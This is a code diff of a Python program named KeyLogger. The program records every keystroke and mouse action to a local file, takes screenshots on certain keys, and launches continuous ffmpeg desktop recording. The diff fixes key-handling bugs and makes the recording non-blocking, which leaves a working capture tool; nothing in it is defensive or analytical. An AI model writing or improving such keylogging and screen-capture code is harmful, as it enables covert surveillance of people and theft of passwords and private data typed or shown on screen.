@@ -9,33 +9,29 @@ from pynput.mouse import Listener as MouseListener
 from PIL import ImageGrab
 from pynput.keyboard import Key
 
-
 class KeyLogger:
     def __init__(self):
         self.log_file = None
         self.setup_logger()
         self.dpi = 96
-        self.start_recording()
 
     def setup_logger(self):
-        logging.basicConfig(filename='key_inputs.txt', level=logging.INFO,
-                            format='%(asctime)s - %(message)s')
+        logging.basicConfig(filename='key_inputs.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
         self.log = logging.getLogger()
 
     def on_press(self, key):
         try:
             current_key = key.char
         except AttributeError:
-            if key == key.space:
+            if key == Key.space:
                 current_key = "SPACE"
-            elif key == key.esc:
+            elif key == Key.esc:
                 current_key = "ESC"
             else:
-                current_key = key
-        self.log.info(str(current_key) + " pressed")
+                current_key = str(key)
+        self.log.info(f"{current_key} pressed")
 
-        # Take screenshot when a specific key is pressed
-        if current_key == "s" or current_key == Key.enter:
+        if current_key == 's' or key == Key.enter:
             self.take_screenshot()
 
     def on_click(self, x, y, button, pressed):
@@ -43,17 +39,16 @@ class KeyLogger:
         self.log.info(f"Mouse {action} at ({x}, {y}) with {button}")
 
     def on_move(self, x, y):
-        x_cm = x / self.dpi * 2.54  # Convert x-coordinate from pixels to centimeters
-        y_cm = y / self.dpi * 2.54  # Convert y-coordinate from pixels to centimeters
-        self.log.info(f"Mouse moved to ({x_cm:.2f} cm, {y_cm:.2f} cm)")  # Log in centimeters
+        x_cm = x / self.dpi * 2.54
+        y_cm = y / self.dpi * 2.54
+        self.log.info(f"Mouse moved to ({x_cm:.2f} cm, {y_cm:.2f} cm)")
 
     def on_scroll(self, x, y, dx, dy):
-        x_cm = x / self.dpi * 2.54  # Convert x-coordinate from pixels to centimeters
-        y_cm = y / self.dpi * 2.54  # Convert y-coordinate from pixels to centimeters
-        dx_cm = dx / self.dpi * 2.54  # Convert horizontal delta from pixels to centimeters
-        dy_cm = dy / self.dpi * 2.54  # Convert vertical delta from pixels to centimeters
-        self.log.info(
-            f"Mouse scrolled at ({x_cm:.2f} cm, {y_cm:.2f} cm) with delta ({dx_cm:.2f} cm, {dy_cm:.2f} cm)")  # Log in centimeters
+        x_cm = x / self.dpi * 2.54
+        y_cm = y / self.dpi * 2.54
+        dx_cm = dx / self.dpi * 2.54
+        dy_cm = dy / self.dpi * 2.54
+        self.log.info(f"Mouse scrolled at ({x_cm:.2f} cm, {y_cm:.2f} cm) with delta ({dx_cm:.2f} cm, {dy_cm:.2f} cm)")
 
     def start(self):
         keyboard_listener = Listener(on_press=self.on_press)
@@ -65,56 +60,43 @@ class KeyLogger:
         keyboard_listener.start()
         mouse_listener.start()
 
+        self.start_recording()
+
         try:
-            # Keep the main thread alive to handle KeyboardInterrupt
             while True:
                 pass
         except KeyboardInterrupt:
-            # Handle KeyboardInterrupt (Ctrl+C) to stop the listeners
             keyboard_listener.stop()
             mouse_listener.stop()
-            sys.exit(0)  # Exit the program gracefully
-
+            sys.exit(0)
 
     def take_screenshot(self):
-        # Create directory if it doesn't exist
         screenshots_dir = os.path.join(os.getcwd(), 'screenshots')
         if not os.path.exists(screenshots_dir):
             os.makedirs(screenshots_dir)
 
-        # Capture screenshot using Pillow
         screenshot = ImageGrab.grab()
-
-        # Generate unique filename with timestamp
         timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
         screenshot_filename = f'screenshot_{timestamp}.png'
         screenshot_path = os.path.join(screenshots_dir, screenshot_filename)
-
-        # Save screenshot to file
         screenshot.save(screenshot_path)
         self.log.info("Screenshot captured")
 
     def start_recording(self):
-        # Command to start recording using ffmpeg
+        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
         command = [
-            'C:/ffmpeg/bin/ffmpeg.exe',  # Full path to ffmpeg executable
-            '-f', 'gdigrab',  # Input format (gdigrab for Windows)
-            '-framerate', '30',  # Frame rate
-            '-i', 'desktop',  # Input source (desktop captures the entire screen)
-            '-c:v', 'libx264',  # Video codec
-            '-preset', 'ultrafast',  # Preset for encoding speed (ultrafast for less CPU usage)
-            'output.mp4'  # Output file name
+            'C:/ffmpeg/bin/ffmpeg.exe',
+            '-f', 'gdigrab',
+            '-framerate', '30',
+            '-i', 'desktop',
+            '-c:v', 'libx264',
+            '-preset', 'ultrafast',
+            f'screenrecord_{timestamp}.mp4'
         ]
-        # Start the recording process
         recording_process = subprocess.Popen(command)
-
-        # Wait for the recording to finish (you can terminate it using recording_process.terminate())
-        recording_process.wait()
-        self.log.info("Screen recorded")
+        self.log.info("Screen recording started")
 
 
-# Example usage:
 if __name__ == "__main__":
     keylogger = KeyLogger()
     keylogger.start()
-
